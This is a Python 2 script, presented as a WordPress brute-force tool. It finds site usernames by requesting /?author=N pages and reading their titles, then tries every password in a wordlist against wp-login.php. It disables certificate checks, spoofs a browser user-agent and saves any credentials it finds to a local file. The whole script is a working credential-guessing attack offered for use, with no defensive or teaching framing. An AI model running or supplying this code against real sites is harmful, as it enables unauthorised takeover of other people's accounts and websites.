#!/usr/bin/python
#coding: utf-8

import requests
from lxml.html import fromstring
from requests.exceptions import ConnectionError
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from tqdm import tqdm
import commands
import sys, os, argparse
reload(sys)
sys.setdefaultencoding('utf-8')

print ''' \033[1;33m
                █▀▀█ █░█  █░░░█    █▀▀█     █▀▀▄     █▀▀
                █▄▀█ ▄▀▄  █▄█▄█ord █░░█ress █▀▀▄RUTE █▀▀ORCER
                █▄▄█ ▀░▀  ░▀░▀░    █▀▀▀     ▀▀▀░     ▀░░
                Coded By Abdullah AlZahrani | Site: www.0xa.tech
                Twitter: @0xAbdullah | GitHub.com/0xAbdullah
\033[1;m\n'''



if len(sys.argv) == 1:
        print '[!] Usage: python WPBF.py -s http://example.com -p passwords.txt'
        sys.exit(1)
parser = argparse.ArgumentParser(description="Wordpress users enumerate and brute force attack")
parser.add_argument( '-s', required=True, default=None, help='target domain or URL')
parser.add_argument( '-p', required=True, default=None , help='Path of the password file.')
parser.add_argument( '-u', required=False, default=None , help='target username.')
args = vars(parser.parse_args())

PasswordFile = args['p']
if os.path.exists(args['p']) == False:
    print "[!] \033[1;33mFile Path Dose Not exist !\033[1;m"
    sys.exit()

headers = { 'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0',
'Content-Type': 'application/x-www-form-urlencoded'}

host = args['s']
if not host.startswith("http"):
    sys.exit("[#]: Wrong SITE formate (ex): http://%s" % (host))
else:
    pass
if args['u'] is None:
    print "[+] Searching for username......"
    ID = 1
    Found = 0
    CheckUser = (host+'/?author=')
    for i in CheckUser:
        try:
            TestUser = (CheckUser+str(ID))
            r = requests.get(TestUser, headers=headers)
            if r.status_code == 200:
                pass
            else:
                break
            r = requests.get(CheckUser+str(ID), headers=headers)
            tree = fromstring(r.content)
            user = tree.findtext('.//title')
            User, sep, tail = user.partition(' ')
            print "[#] ID: %s Username: \033[1;32m%s\033[1;m" % (ID, User)
            Found = 1
            ID = ID+1
        except KeyboardInterrupt:
            break
    if Found == 0:
        print "[!] User Not Found !"
    UserName = raw_input("[+] Enter User Name: ")
else:
    UserName = args['u']


exploit = open(PasswordFile, 'r').readlines()
Target = (host+"/wp-login.php")
print '''
[Host] %s
[UserName] %s
\n''' % (host, UserName)
Found = 0
for line in tqdm(exploit):
    password = line.strip()
    try:
        http = requests.post(Target, data={'log':UserName, 'pwd':password, 'wp-submit':'submit' }, verify=False, timeout=5, headers=headers)
        content = http.content
        if "Dashboard" in content:
            print "\n\n[+] Password Found!"
            print "[+] Dashboard: %s\n[+] Username: %s\n[+] Password: \033[1;42m%s\033[1;m \n[*] Check output.txt File !" % (Target, UserName, password)
            Foundpass = "[~] Target: %s\n[@] User: %s\n[$] Password: %s\n\n" % (Target, UserName, password)
            file = open("output.txt", "a")
            file.write(Foundpass)
            file.close()
            Found = 1
            break
        else:
            pass
    except ConnectionError:
        pass
    except requests.exceptions.Timeout:
        pass
    except KeyboardInterrupt:
        print "\n\n[+] User requested An Interrupt"
        sys.exit()
if Found == 0:
    print "\n[-] Password Not Found !"
else:
    pass
